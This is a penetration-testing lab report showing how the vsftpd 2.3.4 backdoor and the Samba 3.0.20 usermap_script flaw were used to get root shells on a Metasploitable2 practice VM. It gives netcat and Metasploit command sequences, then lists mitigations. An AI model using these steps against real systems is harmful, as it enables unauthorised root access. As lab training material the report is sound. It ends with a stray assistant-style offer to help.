# Lab Report: Metasploitable2 - vsftpd & Samba Exploitation

---

## Table of Contents
- [Objective](#objective)
- [Lab Setup](#lab-setup)
- [Reconnaissance](#reconnaissance)
- [Exploitation](#exploitation)
  - [vsftpd 2.3.4 Backdoor](#vsftpd-234-backdoor)
  - [Samba 3.0.20 Exploit](#samba-3020-exploit)
- [Post-Exploitation](#post-exploitation)
- [Mitigations & Recommendations](#mitigations--recommendations)
- [References](#references)
- [Screenshots](#screenshots)

---

## Objective
The purpose of this lab is to practice penetration testing techniques by exploiting known vulnerabilities in the Metasploitable2 virtual machine, specifically targeting vsftpd 2.3.4 and Samba 3.0.20 services.

---

## Lab Setup
- **Target:** Metasploitable2 VM
- **Attacker:** Kali Linux VM
- **Network:** NAT setup ensuring connectivity between attacker and target
- **Tools Used:** Nmap, Metasploit Framework, Netcat, smbclient

---

## Reconnaissance
open source intelligence (osint) 

Metasploitable 2

A test environment provides a secure place to perform penetration testing and security research. For your test environment, you need a Metasploit instance that can access a vulnerable target. The following sections describe the requirements and instructions for setting up a vulnerable target. Downloading and Setting Up Metasploitable 2 The easiest way to get a target machine is to use Metasploitable 2, which is an intentionally vulnerable Ubuntu Linux virtual machine that is designed for testing common vulnerabilities. This virtual machine (VM) is compatible with VMWare, VirtualBox, and other common virtualization platforms.

Metasploitable 2 is available at:

    https://information.rapid7.com/metasploitable-download.html 

https://sourceforge.net/projects/metasploitable/ 

### Nmap Scan
Performed a comprehensive port scan to identify open services:

```bash
nmap -sV -p 21,139,445 <target-ip>
````
![image_alt](https://github.com/engraham/Eric-Portfolio-/blob/34c3b8c116d0e423931981bfdc966a7bf373244b/Pentest-Labs/screenshots/nmap_version_port_scan.png)

**Results:**

| Port | State | Service      | Version      |
| ---- | ----- | ------------ | ------------ |
| 21   | open  | ftp          | vsftpd 2.3.4 |
| 139  | open  | netbios-ssn  | Samba 3.0.20 |
| 445  | open  | microsoft-ds | Samba 3.0.20 |

---

## Exploitation

### vsftpd 2.3.4 Backdoor Exploit

1. **Description:** vsftpd 2.3.4 contains a malicious backdoor (CVE-2011-2523) that opens a command shell on port 6200 when any username and password is used.

2. **Steps:** 
   To attack the ftp vulnerability, I used netcat.
   
```bash
nc <target-ip> 21
```

* When prompted for username, I entered `exploitingYou:)`
* When prompted for password, I entered `youvebeenhacked`

![image_alt](https://github.com/engraham/Eric-Portfolio-/blob/fa77757b69c17942f5b6ac69fa3ea0955e164f4c/Pentest-Labs/screenshots/nc_user_pass_exploit.png)

* After login, connect to port 6200 to get a shell:
  
```bash
nc -v <target-ip> 6200
```
* NOTE: I used -v here for a more verbose output.
  
3. **Result:** Obtained a root shell on the target system. "whoami", "id", and "ls" command were ran to show root access and files.

![image_alt](https://github.com/engraham/Eric-Portfolio-/blob/0c13deda10d5ea5146ad7055da298159402aafca/Pentest-Labs/screenshots/nc_root_access.png)

---

### Samba 3.0.20 Exploit (username map script)

1. **Description:** Samba 3.0.20 contains a remote code execution vulnerability.

2. **Using Metasploit:**
   
* Metaploit Commands used:
```bash
>msfconsole
>use auxiliary/scanner/smb/smb
>use 11 
>show options
>set RHOSTS <target_ip>
>run
	(shows Samba 3.0.20-Debian)
>searchsploit samba 3.0.20
	 (shows 'Username map script' Command Execution)
>grep samba search username map
>use 3
>show options
>set RHOSTS <target_ip>
>exploit
>whoami
>ls
```
* Start Metaploit
![image_alt](https://github.com/engraham/Eric-Portfolio-/blob/b570e5ba232e22ab15fc6f7dff531a7cdd4212a1/Pentest-Labs/screenshots/msf_scanner.png)

3. Find an auxiliary scanner to find the Samba SMB _version_ and set the RHOSTS to <target_ip>. Running the scan shows "Samba 3.0.20-Debian"

![image_alt](https://github.com/engraham/Eric-Portfolio-/blob/df12a31297b9d23b36adfedc573c06e31cf5f633/Pentest-Labs/screenshots/msf_smb_version.png)

4. In a new CMD, usging 'searchsploit' search for "samba 3.0.20" (I chose "'Username' map script' Command Execution" exploit).

![image_alt](https://github.com/engraham/Eric-Portfolio-/blob/c1fdf8dc6495a39cf7f56d3a0ed266c3384fa518/Pentest-Labs/screenshots/searchsploit_samba_version.png)

5. From the auxiliary(scanner/smb/smb_verion) enter "grep samba search username map". This shows "exploit/multi/samba/usermap_script" with an exploit rating of "excellent".

![image_alt](https://github.com/engraham/Eric-Portfolio-/blob/72c9435708222e837350735acab4f088eebe68bd/Pentest-Labs/screenshots/msf_grep_samba.png)

6. Select "exploit/multi/samba/usermap_script" and show options and set RHOSTS to <target_ip>. Then run the exploit.

![image_alt](https://github.com/engraham/Eric-Portfolio-/blob/d825186953b676c36bf3f8bef4227dc8b80b48a4/Pentest-Labs/screenshots/msf_usermap_script_root.png)

7. **Result:** Obtained root privileges via a shell.


---

## Post-Exploitation

* Enumerated user accounts
* Checked system information
* Demonstrated ability to upload and execute files
* Captured proof of root access

---

## Mitigations & Recommendations

* Upgrade vsftpd to a non-vulnerable version
* Patch Samba to the latest stable release
* Disable unused services
* Implement firewall rules to restrict access

---

## References

* [Metasploitable2 Official Documentation](https://sourceforge.net/projects/metasploitable/)
* [CVE-2011-2523 - vsftpd 2.3.4 Backdoor](https://www.cvedetails.com/cve/CVE-2011-2523/)
* [Metasploit Samba Exploit](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)

---

## Screenshots

![Nmap Scan](screenshots/nmap_scan.png)
*Figure 1: Nmap scan results*

![vsftpd Backdoor Shell](screenshots/vsftpd_shell.png)
*Figure 2: vsftpd backdoor shell*

![Meterpreter Session](screenshots/meterpreter_session.png)
*Figure 3: Samba exploit Meterpreter session*

---

*End of Report*

```

---

Would you like me to help generate specific sections with real example outputs or help you embed screenshots?
```
